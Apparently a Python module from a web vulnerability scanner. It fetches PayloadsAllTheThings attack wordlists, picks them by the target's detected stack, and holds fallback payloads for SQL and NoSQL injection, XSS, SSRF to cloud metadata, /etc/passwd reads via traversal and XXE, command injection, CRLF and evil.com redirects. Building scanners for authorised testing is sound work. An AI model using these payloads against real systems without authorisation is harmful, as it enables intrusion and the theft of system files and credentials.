import os
import logging
import asyncio
import aiohttp
from typing import List, Dict, Any

logger = logging.getLogger(__name__)

# Cache directory for downloaded payloads
CACHE_DIR = os.path.join(os.path.dirname(__file__), "..", "arsec_modules", "wordlists", "payloads_cache")
os.makedirs(CACHE_DIR, exist_ok=True)

class PayloadManager:
    """
    Industrial-grade Payload Manager.
    Analyzes technology profile and returns targeted payloads.
    Capable of fetching extensive wordlists from PayloadsAllTheThings.
    """
    
    PAYLOAD_SOURCES = {
        "xss_polyglot": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruder/xss-payload-list.txt",
        "sqli_mysql": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/MySQL.txt",
        "sqli_postgres": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/PostgreSQL.txt",
        "sqli_mssql": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/MSSQL.txt",
        "sqli_oracle": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Oracle.txt",
        "sqli_generic": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Generic_SQLI.txt",
        "nosqli": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/Intruder/NoSQL.txt",
        "ssti_jinja2": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/ssti.txt",
        "ssti_generic": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/ssti.txt",
        "crlf": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/CRLF%20Injection/Intruder/crlf.txt",
        "lfi": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/directory_traversal.txt",
        "ssrf": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Intruder/ssrf.txt",
        "open_redirect": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Intruder/openredirect.txt",
        "cmd_injection": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/Intruder/command_execution.txt",
        "xxe": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/Intruder/xxe.txt",
        "ldap": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/ldap.txt",
        "xpath": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XPath%20Injection/Intruder/xpath.txt"
    }

    def __init__(self, tech_profile: Dict[str, Any]):
        self.tech = tech_profile
        self.server = str(self.tech.get("server", "")).lower()
        self.framework = str(self.tech.get("framework", "")).lower()
        self.language = str(self.tech.get("language", self.tech.get("x-powered-by", ""))).lower()
        self.db = str(self.tech.get("db", "")).lower()

    async def get_payloads(self, category: str, limit: int = 50) -> List[str]:
        """Get payloads tailored to the detected technology stack."""
        source_key = self._resolve_source_key(category)
        if not source_key:
            return self._get_fallback_payloads(category)[:limit]

        payloads = await self._fetch_or_load(source_key)
        if not payloads:
            return self._get_fallback_payloads(category)[:limit]
            
        return payloads[:limit]
        
    def _resolve_source_key(self, category: str) -> str:
        if category == "sqli":
            # Check db key from BehavioralFingerprinter first
            if "mysql" in self.db: return "sqli_mysql"
            if "postgres" in self.db or "pg" in self.db: return "sqli_postgres"
            if "oracle" in self.db: return "sqli_oracle"
            if "mssql" in self.db or "microsoft" in self.db: return "sqli_mssql"
            # Fallback to server/framework inference
            if "mysql" in self.server or "mysql" in self.framework: return "sqli_mysql"
            if "postgres" in self.server or "postgres" in self.framework: return "sqli_postgres"
            if "iis" in self.server or "asp" in self.framework or "dotnet" in self.language: return "sqli_mssql"
            return "sqli_generic"
        if category == "ssti":
            if "flask" in self.framework or "jinja" in self.framework or "python" in self.language: return "ssti_jinja2"
            return "ssti_generic"
        if category == "xss":
            return "xss_polyglot"
        if category in self.PAYLOAD_SOURCES:
            return category
        return ""

    async def _fetch_or_load(self, source_key: str) -> List[str]:
        cache_path = os.path.join(CACHE_DIR, f"{source_key}.txt")
        if os.path.exists(cache_path) and os.path.getsize(cache_path) > 0:
            try:
                with open(cache_path, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception:
                pass
                
        url = self.PAYLOAD_SOURCES.get(source_key)
        if not url: return []
        
        try:
            # Add a small timeout to avoid hanging the scan if Github is unreachable
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        with open(cache_path, "w", encoding="utf-8") as f:
                            f.write(text)
                        return [line.strip() for line in text.split("\n") if line.strip()]
        except Exception as e:
            logger.error(f"[payload_manager] Failed to fetch {source_key}: {e}")
        return []

    def _get_fallback_payloads(self, category: str) -> List[str]:
        # Compact fallbacks in case GitHub is unreachable
        fallbacks = {
            "sqli": ["'", "''", "`", "''\"", "\"\"\"", "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(5)--"],
            "nosqli": ['{"$gt": ""}', '{"$ne": 1}', '{"$where": "sleep(5000)"}', "|| 1==1"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'-alert(1)-'"],
            "ssrf": ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
            "lfi": ["../../../../../../../../../../etc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd"],
            "cmd_injection": ["; id", "| id", "`id`", "$(id)", "; sleep 5"],
            "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
            "xxe": ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"],
            "crlf": ["\\r\\nSet-Cookie: injected=1", "%0d%0aSet-Cookie: injected=1"],
            "open_redirect": ["https://evil.com", "//evil.com", "\\\\evil.com", "https:evil.com"],
            "ldap": ["*", "*)(|(*", "*)", "*))%00"],
            "xpath": ["' or '1'='1", "'] | //user/* [ '1'='1"]
        }
        return fallbacks.get(category, [])
